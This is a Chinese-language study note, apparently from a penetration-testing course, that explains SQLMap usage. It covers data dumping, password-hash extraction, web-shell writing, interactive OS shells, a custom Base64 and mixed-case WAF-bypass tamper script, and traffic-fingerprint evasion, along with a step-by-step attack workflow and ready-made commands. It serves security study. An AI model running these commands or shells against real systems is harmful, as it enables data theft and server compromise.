> **定位**：SQLMap 是一款开源的**自动化 SQL 注入检测与利用工具**——简单说，前面几篇笔记里讲过的所有手工判断思路（判断字符型/数字型、联合查询、报错注入、布尔/时间盲注、二次注入检测等），SQLMap 都能自动化完成。**理解原理是为了看懂 SQLMap 在干什么、判断它的结果靠不靠谱；用 SQLMap 是为了不用每次都手写几十条 payload 去盲注猜字符。** 两者是互补关系，不是替代关系——SQLMap 跑不出结果或结果可疑时，仍然需要你用前面几篇笔记的原理去手工验证。

## 一、目标指定与提交方式

这一组参数解决的是"SQLMap 该往哪发请求、怎么发"的问题。

| 参数                       | 人话翻译                                                                                                                    |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------- |
| `-u "URL"`               | 指定目标 URL，GET 参数直接写在 URL 里（如 `?id=1`）                                                                                    |
| `--data "param=value"`   | 以 POST 方式提交数据，SQLMap 会自动测试这个数据体里的每个参数                                                                                   |
| `--cookie "name=value"`  | 指定提交的 Cookie，用来测试 Cookie 字段里的注入点（对应前面《HTTP请求头注入面笔记》里讲到的 Cookie 注入场景）                                                    |
| `--headers="name:value"` | 自定义任意请求头（比如测试 `X-Forwarded-For`、`Referer` 等头部注入，同样对应前面笔记里讲过的请求头注入面）                                                     |
| `-r 1.txt`               | **最推荐的用法**——直接从一个保存好的完整 HTTP 请求文件（比如从 Burp Suite 里"Copy to file"导出的请求包）读取目标信息，不需要再手动拼参数，格式最不容易出错，也最适合测试复杂的 POST/JSON 请求 |

> **实战建议**：凡是请求稍微复杂一点（带 Cookie、带自定义头、JSON 格式），优先用 `-r` 从 Burp 导出请求包喂给 SQLMap，比自己手写 `-u`/`--data`/`--cookie` 拼接更不容易出错。

## 二、数据猜解：库 / 表 / 列 / 数据

这是最核心的一组功能，对应前面几篇笔记里"获取数据库名 → 表名 → 列名 → 数据"这个手工流程的**自动化版本**。

| 参数                                  | 作用                               | 对应的手工思路（参见前置笔记）                            |
| ----------------------------------- | -------------------------------- | ------------------------------------------ |
| `--current-db`                      | 获取当前连接使用的数据库名                    | 对应手工里的 `database()`                        |
| `--tables -D "库名"`                  | 获取指定库下所有表名                       | 对应 `information_schema.tables`             |
| `--columns -T "表名" -D "库名"`         | 获取指定表下所有列名                       | 对应 `information_schema.columns`            |
| `--dump -C "列1,列2" -T "表名" -D "库名"` | 把指定列的数据全部导出                      | 对应最后一步直接 `SELECT` 列数据                      |
| `--schema`                          | 一次性拿出整个数据库的结构（所有库、所有表、所有列）       | 比前面几步逐层查询更省事的"一键摸清结构"方式                    |
| `--passwords`                       | 专门针对数据库账号的密码哈希做提取和破解尝试           | 对应《MySQL高权限注入利用笔记》里讲的 `mysql.user` 表密码获取思路 |
| `--dump-all`                        | 把当前权限能看到的所有库的所有表全部导出（慎用，数据量可能极大） | —                                          |

**使用顺序建议**：先 `--current-db` 确认库名 → 再 `--tables -D "库名"` 列出表 → 挑出看起来有价值的表（如含 `admin`、`user`、`member` 字样）→ `--columns -T "表名" -D "库名"` 看列名 → 最后 `--dump -C "具体列名" -T "表名" -D "库名"` 精确导出需要的字段，**不要一上来就无脑 `--dump-all`**，既浪费时间也容易产生大量无关流量，在真实授权测试中还可能对目标数据库造成不必要的压力。

## 三、权限操作：文件 / 命令 / 交互式

这一组对应《MySQL高权限注入利用笔记》里讲过的"权限不同、利用上限不同"的自动化实现——SQLMap 会自动判断当前数据库账号权限，并尝试利用这些权限读写文件、执行系统命令。

| 参数                                          | 作用                                                                                                |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| `--is-dba`                                  | 判断当前数据库账号是否是最高权限用户（DBA，如 MySQL 的 root）                                                            |
| `--privileges`                              | 列出当前账号具体拥有哪些权限                                                                                    |
| `--file-read="/path"`                       | 读取服务器本地指定文件内容（对应手工的 `LOAD_FILE()`，同样受 `secure_file_priv` 限制）                                      |
| `--file-write="本地文件" --file-dest="服务器目标路径"` | 把本地一个文件（比如一句话木马）上传写入到服务器指定路径（对应手工的 `INTO OUTFILE`）                                                |
| `--os-cmd="命令"`                             | 尝试执行一条系统命令并回显结果，SQLMap 会自动判断用什么手法实现（可能是写入 Webshell 再访问，也可能利用数据库自带的命令执行功能，如 MSSQL 的 `xp_cmdshell`） |
| `--os-shell`                                | 直接给你一个**交互式的操作系统命令行**，相当于拿到了一个持续可用的命令执行窗口，而不是一条一条单独执行                                             |
| `--sql-shell`                               | 给你一个**交互式的 SQL 执行窗口**，可以在这里直接手写任意 SQL 语句去执行，比每次都重新构造 SQLMap 命令行参数更灵活                              |
| `--os-pwn`                                  | 更进一步，尝试直接弹出一个 Meterpreter 或 VNC 这类更完整的远控会话（需要配合 Metasploit 环境）                                    |

> **这组参数能不能用，本质上还是取决于《MySQL高权限注入利用笔记》里讲的那些前提条件**（账号是否有 `FILE` 权限、`secure_file_priv` 状态等）——SQLMap 只是帮你自动化尝试并判断"这条路通不通"，背后的原理和你手工操作时完全一致。

## 四、绕过模块：Tamper 脚本

### 4.1 Tamper 脚本解决什么问题

当目标站点前面架了 WAF，或者应用层对一些常见的 SQL 注入特征字符串/关键字做了过滤，直接发送标准 payload 会被拦截或导致注入失效。**Tamper 脚本的作用，就是在 SQLMap 正式把 payload 发出去之前，对这段 payload 做一层"变形处理"**——在不改变 SQL 语句最终执行效果的前提下，改变它的"长相"，从而绕过这些检测规则。

### 4.2 使用方式

```bash
--tamper=base64encode.py
--tamper=space2comment,randomcase   # 可以用逗号同时叠加多个 tamper 脚本
```

`--list-tampers` 可以列出 SQLMap 自带的全部 tamper 脚本（Kali 系统下这些脚本实际存放在 `/usr/share/sqlmap/tamper/` 目录里），常见的几个：

| Tamper 脚本          | 作用                                                                                                                                                |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| `base64encode.py`  | 把整个 payload 用 Base64 编码后再提交——**适用场景**：目标应用本身会先对接收到的参数做一次 Base64 解码，再把解码结果拼进 SQL（呼应《SQL注入实战进阶笔记》里讲过的"数据传输格式复杂化"——Base64 不只是传输格式的障碍，反过来也可以被当作绕过手段用） |
| `space2comment.py` | 把 payload 里的空格替换成 `/**/` 这种内联注释，绕过"检测到空格就拦截"这类简单粗暴的 WAF 规则                                                                                        |
| `randomcase.py`    | 把 SQL 关键字随机改成大小写混合（如 `SELECT` 变成 `SeLeCt`），绕过只匹配固定大小写关键字的过滤规则（MySQL 等数据库本身不区分关键字大小写，所以不影响实际执行效果）                                                  |
| `charencode.py`    | 对 payload 做 URL 编码处理                                                                                                                              |
| `unmagicquotes.py` | 绕过 PHP 早期版本的 `magic_quotes_gpc` 自动转义机制（详见《PHP安全防御机制笔记》）                                                                                           |
| `equaltolike.py`   | 把 `=` 替换成 `LIKE`，语义等价但特征不同                                                                                                                        |

### 4.3 自定义 Tamper 脚本逐行解析

课程里给的示例脚本，逐行翻译它在干什么：

```python
from lib.core.convert import encodeBase64
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW
```

**人话**：引入 SQLMap 内置的 Base64 编码工具函数，并设置这个 tamper 脚本的**执行优先级为"低"**——如果同时叠加使用了多个 tamper 脚本，优先级决定了谁先对 payload 做处理，这里设成 LOW 通常是因为 Base64 编码应该放在所有"文本层面的变形"都做完之后，作为最后一步再执行（道理很简单：如果先编码再做大小写替换，编码后的内容会被破坏）。

```python
def dependencies():
    pass
```

**人话**：声明这个脚本对运行环境（数据库类型等）没有特殊依赖要求，直接留空即可。

```python
def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace('SELECT','sElEct')
        payload = payload.replace('select','sElEct')
        payload = payload.replace('OR','Or')
        payload = payload.replace('or','Or')
        payload = payload.replace('AND','And')
        payload = payload.replace('and','And')
        payload = payload.replace('XOR','xOr')
        payload = payload.replace('xor','xOr')
        payload = payload.replace('SLEEP','SleeP')
        payload = payload.replace('sleep','SleeP')
        payload = payload.replace('ELT','Elt')
    return encodeBase64(payload, binary=False) if payload else payload
```

**人话**：这是真正执行"变形"逻辑的核心函数。先把 payload 里几个最容易被 WAF 关键字匹配规则识别的敏感词（`SELECT`、`OR`、`AND`、`XOR`、`SLEEP`、`ELT`，不管大小写），**统一替换成大小写混合的写法**（比如 `SELECT` 变成 `sElEct`）——很多简单的 WAF 规则是按"精确匹配全大写或全小写的关键字"来拦截的，大小写混写能直接绕过这类规则，而 SQL 本身不区分大小写，不影响实际执行效果。**最后一步，把处理完的整个 payload 再套一层 Base64 编码**（对应脚本开头说的"放在最后执行"）。

**这个脚本对应的实战场景**：目标应用**既对大小写敏感词做了过滤，同时又会对接收到的参数先做 Base64 解码再使用**——这是两层防护叠加的情况，单独绕过任何一层都不够，所以需要一个"先做大小写变形，再整体 Base64 编码"的组合式 tamper 脚本，这也正是课程给的示例注释里提到的"base64+json注入&再加有过滤的注入"这个场景的含义。

## 五、分析拓展：代理 / 调试 / 指纹 / 风险等级

### 5.1 调试与代理

| 参数                                | 作用                                                                                                                                               |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `-v LEVEL`（0-6）                   | 设置输出信息的详细程度，数字越大输出越啰嗦，调试疑难问题时调高，正常使用时保持默认即可                                                                                                      |
| `--proxy "http://127.0.0.1:8080"` | 让 SQLMap 的所有请求都走指定代理——**最常见的用法是把 SQLMap 的流量代理到 Burp Suite**，这样就能在 Burp 里实时看到 SQLMap 每一次尝试发出的具体 payload，配合前面几篇笔记的原理知识，可以直观验证"SQLMap 这一步到底在测试什么假设" |

### 5.2 打乱默认指纹特征

SQLMap 作为一款知名工具，它默认的请求特征（比如固定的 User-Agent 字符串 `sqlmap/x.x...`）很容易被流量监控设备或 WAF 直接识别并拦截，这组参数用来"伪装"：

| 参数                      | 作用                                                                                                       |
| ----------------------- | -------------------------------------------------------------------------------------------------------- |
| `--user-agent "自定义字符串"` | 手动指定一个看起来正常的 User-Agent                                                                                  |
| `--random-agent`        | 每次请求都从内置的常见浏览器 UA 列表里随机选一个，更接近真实用户流量                                                                     |
| `--delay=秒数`            | 每次请求之间插入延迟，避免因为请求频率过高被判定为自动化攻击流量                                                                         |
| `--time-sec=秒数`（默认 5）   | **专门针对时间盲注**的延迟判断阈值——对应前面《SQL盲注原理笔记》里讲的 `sleep()` 判断原理，默认用 5 秒作为"是否延迟"的判断基准，如果目标网络本身不稳定、波动较大，可以调大这个值避免误判 |

### 5.3 测试深度：`--level` 与 `--risk`

这是 SQLMap 最核心的两个调优参数，直接决定了它测试的"广度"和"激进程度"：

| 参数              | 取值范围 | 含义                                                                                                                                                                |
| --------------- | ---- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--level`（默认 1） | 1-5  | 决定 SQLMap **测试哪些位置、用多少种 payload 变体**。等级越高，测试的参数范围越广（比如高等级会测试 Cookie、User-Agent、Referer 等请求头里的参数，对应前面《HTTP请求头注入面笔记》提到的这些位置），尝试的 payload 种类也越多，但相应地请求数量会成倍增加，测试耗时更长 |
| `--risk`（默认 1）  | 1-3  | 决定 SQLMap **愿意尝试多"危险"的 payload**。等级越高，会尝试一些可能对目标数据造成实际影响的 payload（比如涉及 `UPDATE`/`DELETE` 等有数据改写风险的测试语句），等级 1 只用安全的只读型测试                                           |

**实战建议**：`--level=5 --risk=3` 能测得最全面，但请求量巨大、耗时长，且在授权测试中如果数据库支持堆叠或者涉及写操作的高危 payload，有一定概率对目标数据产生实际影响——**务必只在明确授权的测试环境中使用高 level/risk 组合**，日常测试建议从默认的 `--level=1 --risk=1` 开始，有线索再针对性提高。

## 六、结合前置笔记的完整渗透工作流

这一节把前面几篇手工注入笔记和 SQLMap 的具体参数串成一条**从发现到拿下的完整决策流程**——核心思路是：**先用手工原理判断"这里值不值得打、该往哪个方向打"，再用 SQLMap 把判断对的方向自动化执行**，而不是一上来就无脑跑 SQLMap 碰运气。

```
第 0 步：信息收集 —— 判断数据库类型、业务操作类型
    ↓ 对应《SQL注入全数据库类型实战笔记》第 1 章、《HTTP请求头注入面笔记》第二节
    判断目标功能背后是 SELECT / INSERT / UPDATE / DELETE 中的哪一种，
    判断数据库类型（看报错信息、默认端口、URL 特征）
    ↓
第 1 步：手工初步探测，确认注入点存在
    ↓ 对应《SQL注入全数据库类型实战笔记》第 9.2 节：单引号、and 1=1/1=2 对比
    这一步不建议直接交给 SQLMap —— 手工探测成本极低（几次请求），
    能帮你提前判断"这里到底有没有必要跑 SQLMap"，避免浪费大量自动化扫描时间
    ↓ 确认存在注入
第 2 步：SQLMap 基础探测，确认注入类型与可用技术
    sqlmap -r request.txt --batch
    ↓ SQLMap 会自动尝试联合查询、报错、布尔盲注、时间盲注等多种手法并报告哪些可用，
    对应本文档第二节 + 《SQL盲注原理笔记》全文的自动化版本
    ↓
第 3 步：根据第 0 步判断的业务操作类型，决定下一步打法
    ├─ SELECT 且有回显 → 直接 --dump 拿数据（对应本文档第二节）
    ├─ INSERT/UPDATE/DELETE → SQLMap 会自动尝试报错/盲注/堆叠，
    │   若 SQLMap 报告支持 stacked queries，说明命中了
    │   《堆叠注入与二次注入笔记》第一节讲的"中间层支持多语句执行"场景，
    │   可以在 --sql-shell 里直接执行任意语句
    └─ 怀疑是"先存后用"型业务（如昵称/备注类字段）→
        SQLMap 默认检测流程很难自动发现，需要按
        《堆叠注入与二次注入笔记》第 2.3 节的步骤手工验证
    ↓
第 4 步：权限判断，决定利用上限
    sqlmap -r request.txt --is-dba --privileges
    ↓ 对应《MySQL高权限注入利用笔记》第一、二节：
    高权限（有 FILE 权限）→ 第 5 步可以直接冲文件读写/拿 Shell
    低权限 → 止步于数据提取，老老实实 --dump 拿数据即可，
    不要在没有 FILE 权限的账号上浪费时间尝试 --os-shell
    ↓
第 5 步（仅高权限时）：文件操作与系统交互
    sqlmap -r request.txt --file-read="/path"       # 读文件
    sqlmap -r request.txt --file-write="shell.php" --file-dest="/var/www/html/x.php"  # 写 Shell
    sqlmap -r request.txt --os-shell                # 交互式命令行
    ↓ 若 --file-write 因 secure_file_priv 限制失败，
    对应《MySQL高权限注入利用笔记》第三节讲的 general_log 写 Shell 思路 ——
    这条路 SQLMap 不会自动帮你走，需要切到 --sql-shell 手工执行
    对应的 SET GLOBAL 系列语句
    ↓
第 6 步（全程遇阻时）：绕过与规避
    被 WAF 拦截 → 本文档第四节 Tamper 脚本
    被流量指纹识别 → 本文档第 5.2 节伪装 User-Agent / 加延迟
    测试深度不够、怀疑漏报 → 提高 --level / --risk（本文档第 5.3 节）
```

**这条工作流想说明的核心道理**：SQLMap 的每一个参数背后都有对应的手工原理支撑，**第 0-1 步的手工判断决定了你该往哪个方向用 SQLMap、预期会得到什么结果**；如果跳过这两步直接盲跑 SQLMap，遇到"跑不出结果"的情况时，你会因为不知道背后的原理而无从下手排查，这也是为什么前面几篇手工笔记要先讲透的原因——工具的参数是死的，原理才是能让你在工具失效时继续往下走的东西。

## 七、实战常用组合命令

```bash
# 最基础的探测：从请求文件读取目标，静默模式自动选择默认选项
sqlmap -r request.txt --batch

# 探测 + 直接获取当前库名
sqlmap -r request.txt --batch --current-db

# 指定某个参数测试，提高测试深度，获取所有数据库密码
sqlmap -r request.txt -p id --level=5 --risk=3 --passwords

# 走 Burp 代理，方便实时查看请求细节，配合调试原理
sqlmap -r request.txt --proxy="http://127.0.0.1:8080" -v 3

# 结合 tamper 绕过，获取数据库完整结构
sqlmap -r request.txt --tamper=space2comment,randomcase --schema

# 确认高权限后，直接尝试拿一个交互式系统命令行
sqlmap -r request.txt --batch --is-dba --os-shell
```

## 八、总结：SQLMap 和手工注入笔记的关系

1. **SQLMap 的每一个功能，背后都能在前面几篇笔记里找到对应的手工原理**——`--dump` 对应手工的 `union select`/`group_concat`，`--os-shell` 对应《MySQL高权限注入利用笔记》里讲的文件写入/日志写 Shell 思路，`--tamper` 对应你需要理解"WAF 是按什么规则拦截的，才能知道该用哪个绕过脚本"。
2. **SQLMap 跑不出结果，不代表没有注入**，很可能是：目标用了 SQLMap 内置 tamper 脚本应付不了的复杂过滤规则（这时需要你手写自定义 tamper，照着 4.3 节的思路自己写）、或者是《堆叠注入与二次注入笔记》里讲的二次注入这类**SQLMap 默认检测逻辑很难自动发现**的复杂场景（需要配合 `--second-order` 这类专门针对二次注入设计的参数，或者干脆手工验证）。
3. **工具是放大器，不是替代品**——理解原理的人用 SQLMap 效率倍增（知道该调哪个参数、该写什么 tamper）；不理解原理的人用 SQLMap 只能"跑了等结果"，遇到跑不出来的情况就束手无策。
